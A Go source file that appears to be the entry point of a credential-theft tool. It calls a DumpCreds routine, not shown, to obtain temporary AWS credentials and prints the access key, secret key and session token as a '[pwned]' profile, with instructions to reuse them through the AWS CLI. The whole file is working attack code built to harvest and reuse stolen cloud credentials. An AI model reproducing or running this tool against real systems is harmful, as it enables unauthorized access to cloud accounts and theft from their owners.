package main

import (
	"context"
	"fmt"
	"os"
	"time"
)

func checkError(err error) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v", err)
		os.Exit(1)
	}
}

func main() {
	fmt.Println("[*] Attempting to get credentials...")
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*20)
	defer cancel()
	creds, err := DumpCreds(ctx)
	checkError(err)
	fmt.Println("[+] Retrieved temporary credentials!")
	fmt.Printf("Expire at: %s\n", creds.Expiration)
	fmt.Println("Copy the below into your ~/.aws/credentials file and run with: aws --profile pwned ...")
	fmt.Println("[pwned]")
	fmt.Println("region = us-east-1")
	fmt.Printf("aws_access_key_id = %s\n", creds.AccessKeyId)
	fmt.Printf("aws_secret_access_key = %s\n", creds.SecretAccessKey)
	fmt.Printf("aws_session_token = %s\n", creds.Token)
}
